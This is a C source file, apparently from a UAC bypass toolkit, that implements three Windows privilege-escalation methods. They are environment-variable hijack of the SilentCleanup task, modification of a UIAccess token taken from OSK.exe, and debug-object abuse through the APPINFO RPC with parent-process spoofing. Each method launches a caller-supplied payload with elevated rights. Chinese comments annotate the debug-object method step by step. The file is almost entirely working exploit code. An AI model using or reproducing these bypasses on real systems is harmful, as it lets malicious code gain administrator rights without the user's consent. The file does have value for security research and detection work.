/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2020
*
*  TITLE:       TYRANID.C
*
*  VERSION:     3.54
*
*  DATE:        24 Nov 2020
*
*  James Forshaw autoelevation method(s)
*  Fine Dinning Tool (c) CIA
*
*  For description please visit original URL
*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
*  https://tyranidslair.blogspot.com/2019/02/accessing-access-tokens-for-uiaccess.html
*  https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmxStartTask
*
* Purpose:
*
* Run target task as schtasks does.像schtasks那样运行目标任务。
*
*/
BOOLEAN ucmxStartTask()
{
    HRESULT hr_init, hr = E_FAIL;
    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    IRegisteredTask* pTask = NULL;
    IRunningTask* pRunningTask = NULL;
    VARIANT var;

    BSTR bstrTaskFolder = NULL;
    BSTR bstrTask = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    do {

        bstrTaskFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
        if (bstrTaskFolder == NULL)
            break;

        bstrTask = SysAllocString(L"SilentCleanup");
        if (bstrTask == NULL)
            break;

        hr = CoCreateInstance(&CLSID_TaskScheduler,
            NULL,
            CLSCTX_INPROC_SERVER,
            &IID_ITaskService,
            (void**)&pService);

        if (FAILED(hr))
            break;

        var.vt = VT_NULL;

        hr = pService->lpVtbl->Connect(pService, var, var, var, var);
        if (FAILED(hr))
            break;

        hr = pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pRootFolder);
        if (FAILED(hr))
            break;

        hr = pRootFolder->lpVtbl->GetTask(pRootFolder, bstrTask, &pTask);
        if (FAILED(hr))
            break;

        hr = pTask->lpVtbl->RunEx(pTask, var, TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, &pRunningTask);
        if (FAILED(hr))
            break;

    } while (FALSE);

    if (bstrTaskFolder)
        SysFreeString(bstrTaskFolder);

    if (bstrTask)
        SysFreeString(bstrTask);

    if (pRunningTask) {
        pRunningTask->lpVtbl->Stop(pRunningTask);
        pRunningTask->lpVtbl->Release(pRunningTask);
    }

    if (pTask)
        pTask->lpVtbl->Release(pTask);

    if (pRootFolder)
        pRootFolder->lpVtbl->Release(pRootFolder);

    if (pService)
        pService->lpVtbl->Release(pService);

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    return SUCCEEDED(hr);
}

/*
* ucmDiskCleanupEnvironmentVariable
*
* Purpose:
*
* DiskCleanup task uses current user environment variables to build a path to the executable.
* Warning: this method works with AlwaysNotify UAC level.
*
*/
NTSTATUS ucmDiskCleanupEnvironmentVariable(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    WCHAR   szEnvVariable[MAX_PATH * 2];

    do {

        if (_strlen(lpszPayload) > MAX_PATH)
            return STATUS_INVALID_PARAMETER;

        //
        // Add quotes.
        //
        szEnvVariable[0] = L'\"';
        szEnvVariable[1] = 0;
        _strncpy(&szEnvVariable[1], MAX_PATH, lpszPayload, MAX_PATH);
        _strcat(szEnvVariable, L"\"");

        //
        // Set our controlled env.variable with payload.
        //
        if (!supSetEnvVariableEx(FALSE, NULL, T_WINDIR, szEnvVariable))
            break;

        //
        // Run trigger task.
        //
        if (ucmxStartTask())
            MethodResult = STATUS_SUCCESS;

        //
        // Cleaup our env.variable.
        //
        supSetEnvVariableEx(TRUE, NULL, T_WINDIR, NULL);

    } while (FALSE);

    return MethodResult;
}

/*
* ucmxTokenModUIAccessMethodInitPhase
*
* Purpose:
*
* Convert dll to new entrypoint/exe.
*
*/
BOOL ucmxTokenModUIAccessMethodInitPhase(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE;

    WCHAR szBuffer[MAX_PATH * 2];

    //
    // Patch Fubuki to the new entry point and convert to EXE
    //
    if (supReplaceDllEntryPoint(ProxyDll,
        ProxyDllSize,
        FUBUKI_ENTRYPOINT_UIACCESS2,
        TRUE))
    {
        //
        // Drop modified Fubuki to the %temp%
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, PKGMGR_EXE);
        bResult = supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize);
    }

    return bResult;
}

/*
* ucmTokenModUIAccessMethod
*
* Purpose:
*
* Obtain token from UIAccess application, modify it and reuse for UAC bypass.
*
*/
NTSTATUS ucmTokenModUIAccessMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS Status = STATUS_ACCESS_DENIED;
    LPWSTR lpszPayload = NULL;
    PSID pIntegritySid = NULL;
    HANDLE hDupToken = NULL, hProcessToken = NULL;
    SHELLEXECUTEINFO shinfo;
    SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
    TOKEN_MANDATORY_LABEL tml;
    SECURITY_QUALITY_OF_SERVICE sqos;
    OBJECT_ATTRIBUTES obja;
    WCHAR szBuffer[MAX_PATH * 2];

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

    do {
        //
        // Tweak and drop payload to %temp%.
        //
        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll, ProxyDllSize))
            break;

        //
        // Spawn OSK.exe process.
        //
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, OSK_EXE);

        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = szBuffer;
        shinfo.nShow = SW_HIDE;
        if (!ShellExecuteEx(&shinfo))
            break;

        //
        // Open process token.
        //
        Status = NtOpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
        if (!NT_SUCCESS(Status))
            break;

        //
        // Duplicate primary token.
        //
        sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        sqos.ImpersonationLevel = SecurityImpersonation;
        sqos.ContextTrackingMode = 0;
        sqos.EffectiveOnly = FALSE;
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        obja.SecurityQualityOfService = &sqos;
        Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
        if (!NT_SUCCESS(Status))
            break;

        NtClose(hProcessToken);
        hProcessToken = NULL;

        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
        NtClose(shinfo.hProcess);
        shinfo.hProcess = NULL;

        //
        // Lower duplicated token IL from Medium+ to Medium.
        //
        Status = RtlAllocateAndInitializeSid(&MLAuthority,
            1, SECURITY_MANDATORY_MEDIUM_RID,
            0, 0, 0, 0, 0, 0, 0,
            &pIntegritySid);
        if (!NT_SUCCESS(Status))
            break;

        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid = pIntegritySid;

        Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
            (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
        if (!NT_SUCCESS(Status))
            break;

        RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
        si.cb = sizeof(STARTUPINFO);
        GetStartupInfo(&si);

        // 
        // Run second stage exe to perform some gui hacks.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, PKGMGR_EXE);

        if (g_ctx->OptionalParameterLength == 0)
            lpszPayload = g_ctx->szDefaultPayload;
        else
            lpszPayload = g_ctx->szOptionalParameter;

        if (CreateProcessAsUser(hDupToken,
            szBuffer,    //application
            lpszPayload, //command line
            NULL,
            NULL,
            FALSE,
            CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &si,
            &pi))
        {
            if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT)
                TerminateProcess(pi.hProcess, (UINT)-1);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Status = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (hProcessToken) NtClose(hProcessToken);

    if (shinfo.hProcess) {
        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
        NtClose(shinfo.hProcess);
    }
    if (hDupToken) NtClose(hDupToken);
    if (pIntegritySid) RtlFreeSid(pIntegritySid);

    _strcpy(szBuffer, g_ctx->szTempDirectory);
    _strcat(szBuffer, PKGMGR_EXE);
    DeleteFile(szBuffer);

    return Status;
}

/*
* ucmxCreateProcessFromParent
*
* Purpose:
*
* Create new process using parent process handle. 创建新进程使用父进程句柄
*
*/
NTSTATUS ucmxCreateProcessFromParent(
    _In_ HANDLE ParentProcess,
    _In_ LPWSTR Payload)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0x30;
    //char* Payload = Payload;
    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    do {
        if (size > 1024)
            break;

        si.lpAttributeList = supHeapAlloc(size);
        if (si.lpAttributeList) {

            if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
                if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), 0, 0)) //-V616
                {
                    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                    si.StartupInfo.wShowWindow = SW_SHOW;

                    if (CreateProcess(NULL,
                        Payload,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
                        NULL,
                        g_ctx->szSystemRoot,
                        (LPSTARTUPINFO)&si,
                        &pi))
                    {
                        CloseHandle(pi.hThread);
                        CloseHandle(pi.hProcess);
                        status = STATUS_SUCCESS;
                    }
                }
            }

            if (si.lpAttributeList)
                DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

            supHeapFree(si.lpAttributeList);
        }
    } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);

    return status;
}

/*
* ucmDebugObjectMethod
*
* Purpose:
*
* Bypass UAC by direct RPC call to APPINFO and DebugObject use. 
* 直接的rpc调用 appinfo 和调试对象使用
*/
NTSTATUS ucmDebugObjectMethod(
    _In_ LPWSTR lpszPayload
)
{
    //UINT retryCount = 0;

    NTSTATUS status = STATUS_ACCESS_DENIED;

    HANDLE dbgHandle = NULL, dbgProcessHandle, dupHandle;

    PROCESS_INFORMATION procInfo;

    DEBUG_EVENT dbgEvent;

    WCHAR szProcess[MAX_PATH * 2];


    do {

        //
        // Spawn initial non elevated victim process under debug.
        // 


        //do { /* remove comment for attempt to spam debug object within thread pool */

        _strcpy(szProcess, g_ctx->szSystemDirectory);
        _strcat(szProcess, WINVER_EXE);
        // AicLaunchAdminProcess 这个常用于UAC绕过，启动成功后返回1构造RPC请求，执行管理员的操作时会调用他？ 
        if (!AicLaunchAdminProcess((LPWSTR)L"C:\\Windows\\system32\\winver.exe", // 0x012fec5c L"C:\\Windows\\system32\\winver.exe"
            (LPWSTR)L"C:\\Windows\\system32\\winver.exe",
            0,    // startflags设置为0
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, // debug_process创建标志设置 初始化服务器中 RPC 线程的 TEB 中的调试对象字段，并将其分配给新进程。
            g_ctx->szSystemRoot,
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }


        //
        // Capture debug object handle. 捕获debug对象句柄
        //
        // supGetProcessDebugObject 这个里边包含了对 NtQueryInformationProcess 函数的调用
        status = supGetProcessDebugObject(procInfo.hProcess, // 使用NtQueryInformationProcess和返回的进程句柄打开调试对象的句柄。
            &dbgHandle);


        if (!NT_SUCCESS(status)) {  // 创建句柄如果不成功
            TerminateProcess(procInfo.hProcess, 0);  
            CloseHandle(procInfo.hThread);
            CloseHandle(procInfo.hProcess);
            break;
        }

        //
        // Detach debug and kill non elevated victim process. 分离、调试和杀死未提升的受害进程（分离调试器并终止不再需要的新进程）
        //
        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle); // 分离调试器
        TerminateProcess(procInfo.hProcess, 0);             // 终止进程
        CloseHandle(procInfo.hThread);
        CloseHandle(procInfo.hProcess);

        //} while (++retryCount < 20);

        //
        // Spawn elevated victim under debug.  在调试状态下生成提升的受害者
        //
        _strcpy(szProcess, g_ctx->szSystemDirectory);
        _strcat(szProcess, COMPUTERDEFAULTS_EXE); // 0x008fe9fc L"C:\\Windows\\system32\\computerdefaults.exe"
        RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
        RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));
        
        if (!AicLaunchAdminProcess(szProcess,  // 创建一个新进程
            szProcess,
            1,                                 // startflag设置为1 
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, // DEBUG_PROCESS创建标志设置 
            g_ctx->szSystemRoot,  // 由于TEB中的调试对象字段已经初始化了，所以将把NtQueryInformationProcess捕获的现有对象分配给新进程
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //
        // Update thread TEB with debug object handle to receive debug events. 用调试对象句柄更新线程TEB以接收调试事件
        // 检索将返回完整访问进程句柄的初始调试事件？
        DbgUiSetThreadDebugObject(dbgHandle);  /* Just set the handle in the TEB 设置TEB句柄*/ 
        dbgProcessHandle = NULL;

        //
        // Debugger wait cycle. 调试器等待周期 因为一次不一定能成 所以需要做个循环
        //
        while (1) {

            if (!WaitForDebugEvent(&dbgEvent, INFINITE))  // 等待正在调试的进程中发生调试事件。
                break;

            switch (dbgEvent.dwDebugEventCode) {

                //
                // Capture initial debug event process handle. 捕获初始调试事件处理句柄
                //
            case CREATE_PROCESS_DEBUG_EVENT:
                dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
                break;
            }

            if (dbgProcessHandle)
                break;
            // 使调试器能够继续 先前报告调试事件的线程 逐个？
            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE); 

        }

        if (dbgProcessHandle == NULL)
            break;

        //
        // Create new handle from captured with PROCESS_ALL_ACCESS.  使用PROCESS_ALL_ACCESS创建新的句柄。
        //
        dupHandle = NULL;
        status = NtDuplicateObject(dbgProcessHandle,
            NtCurrentProcess(),
            NtCurrentProcess(),
            &dupHandle,
            PROCESS_ALL_ACCESS,
            0,
            0);

        if (NT_SUCCESS(status)) {
            //
            // Run new process with parent set to duplicated process handle. 运行新的进程，父进程设置为重复的进程句柄。
            //
            ucmxCreateProcessFromParent(dupHandle, lpszPayload); // 在这里运行起来 创建新进程使用父进程句柄,涉及父进程欺骗
            NtClose(dupHandle);
        }

#pragma warning(push)
#pragma warning(disable: 6387)
        DbgUiSetThreadDebugObject(NULL); /* Just set the handle in the TEB 设置TEB句柄*/ 
#pragma warning(pop)

        NtClose(dbgHandle);
        dbgHandle = NULL;

        CloseHandle(dbgProcessHandle);

        //
        // Release victim process. 释放受害者的过程。
        //
        CloseHandle(procInfo.hThread);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hProcess);

    } while (FALSE);

    if (dbgHandle) NtClose(dbgHandle);
    supSetGlobalCompletionEvent();
    return status;
}
